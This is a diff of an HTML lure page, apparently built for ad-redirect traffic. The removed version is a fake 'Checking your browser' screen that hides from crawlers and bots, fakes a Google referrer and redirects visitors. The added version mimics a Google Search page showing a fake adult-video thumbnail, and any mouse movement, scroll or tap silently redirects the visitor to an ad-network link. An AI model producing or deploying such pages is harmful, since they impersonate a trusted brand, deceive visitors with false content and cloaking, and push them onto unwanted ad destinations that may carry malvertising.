@@ -1,98 +1,169 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <title>Checking your browser...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="referrer" content="origin" />
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    #continue-btn {
-      display: none;
-      margin-top: 20px;
-      padding: 12px 24px;
-      font-size: 18px;
-      background: #0f0;
-      color: #000;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Search results - Video encontrado</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0; padding: 0; background: #fff;
+    color: #222;
+  }
+  header {
+    background: #f8f8f8;
+    padding: 12px 20px;
+    border-bottom: 1px solid #ddd;
+  }
+  header h1 {
+    margin: 0; font-weight: normal;
+    font-size: 20px;
+  }
+  .search-bar {
+    margin-top: 10px;
+    display: flex;
+    max-width: 600px;
+  }
+  .search-bar input[type="text"] {
+    flex-grow: 1;
+    padding: 8px 12px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 4px 0 0 4px;
+  }
+  .search-bar button {
+    padding: 8px 16px;
+    border: none;
+    background: #4285f4;
+    color: white;
+    font-weight: bold;
+    font-size: 16px;
+    border-radius: 0 4px 4px 0;
+    cursor: pointer;
+  }
+  main {
+    max-width: 600px;
+    margin: 20px auto;
+    padding: 0 10px;
+  }
+  .video-container {
+    position: relative;
+    margin-top: 20px;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    cursor: pointer;
+  }
+  .video-container img {
+    width: 100%;
+    display: block;
+    user-select: none;
+  }
+  .play-button {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 80px; height: 80px;
+    background: #ff3366;
+    border-radius: 50%;
+    box-shadow: 0 0 20px #ff3366;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: pulse 1.5s infinite;
+  }
+  .play-button::before {
+    content: '';
+    border-style: solid;
+    border-width: 16px 0 16px 26px;
+    border-color: transparent transparent transparent white;
+    margin-left: 6px;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 20px #ff3366; }
+    50% { transform: translate(-50%, -50%) scale(1.1); box-shadow: 0 0 30px #ff3366; }
+  }
+  .disclaimer {
+    font-size: 14px;
+    color: #555;
+    margin-top: 15px;
+    text-align: center;
+  }
+</style>
 
-  <!-- Google Analytics -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-H9VLD02NMS');
-  </script>
+<!-- Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-H9VLD02NMS');
+</script>
+
 </head>
 <body>
-  <h2>Checking your browser...</h2>
-  <p>Please move your mouse, scroll, or tap to continue</p>
-  <p id="status">Awaiting interaction...</p>
-  <button id="continue-btn" onclick="proceed()">Continue</button>
 
-  <script>
-    const finalURL = "https://www.profitableratecpm.com/vrnbr8pt?key=67320c384bf7b5f34dbf7369c25f97e9";
+<header>
+  <h1>Google Search</h1>
+  <form class="search-bar" onsubmit="return false;">
+    <input type="text" placeholder="Buscar videos interesantes..." value="Video para adultos" />
+    <button disabled>Buscar</button>
+  </form>
+</header>
 
-    const isBot = () => {
-      return (
-        navigator.webdriver ||
-        /bot|crawl|spider|preview|fetch|facebook|whatsapp|telegram|pingdom/i.test(navigator.userAgent) ||
-        !navigator.userAgent ||
-        screen.width < 100 || screen.height < 100
-      );
-    };
+<main>
+  <p>Resultados de búsqueda para <strong>"Video para adultos"</strong></p>
 
-    let humanDetected = false;
+  <div class="video-container" id="videoFake">
+    <img src="https://www.pornxpert.com/contents/videos_screenshots/4000/4767/preview.mp4.jpg" alt="Video preview" />
+    <div class="play-button"></div>
+  </div>
 
-    function enableAccess() {
-      if (!humanDetected) {
-        humanDetected = true;
-        document.getElementById('status').innerText = 'Human verified!';
-        document.getElementById('continue-btn').style.display = 'inline-block';
-        gtag('event', 'human_detected', { event_category: 'engagement' });
-      }
+  <p class="disclaimer">Haz clic en el video para continuar.</p>
+</main>
+
+<script>
+  const redirectUrl = 'https://www.profitableratecpm.com/vrnbr8pt?key=67320c384bf7b5f34dbf7369c25f97e9';
+
+  let interacted = false;
+
+  function redirectIfHuman() {
+    if(interacted) {
+      window.location.href = redirectUrl;
     }
+  }
 
-    function proceed() {
-      // Simular que viene de Google
-      history.replaceState(null, '', 'https://www.google.com/search?q=free+video');
+  // Listen to user interactions
+  function userInteracted() {
+    interacted = true;
+    // Send event to Google Analytics
+    gtag('event', 'interaction', {
+      'event_category': 'user',
+      'event_label': 'human_verified',
+      'value': 1,
+    });
+    // Redirect after small delay
+    setTimeout(() => {
+      redirectIfHuman();
+    }, 300);
+  }
 
-      gtag('event', 'redirect', {
-        event_category: 'navigation',
-        event_label: finalURL
-      });
+  // Add interaction listeners
+  document.getElementById('videoFake').addEventListener('click', userInteracted);
+  document.addEventListener('mousemove', userInteracted, {once: true});
+  document.addEventListener('touchstart', userInteracted, {once: true});
+  document.addEventListener('scroll', userInteracted, {once: true});
 
-      window.location.href = finalURL;
+  // If no interaction after 30 seconds, do nothing
+  setTimeout(() => {
+    if(!interacted) {
+      console.log('No interaction detected; no redirect.');
     }
+  }, 30000);
+</script>
 
-    if (isBot()) {
-      document.getElementById('status').innerText = 'Access denied. Bot detected.';
-    } else {
-      ['mousemove', 'scroll', 'touchstart', 'click'].forEach(event => {
-        window.addEventListener(event, enableAccess, { once: true });
-      });
-    }
-  </script>
 </body>
 </html>
-
 
 
 
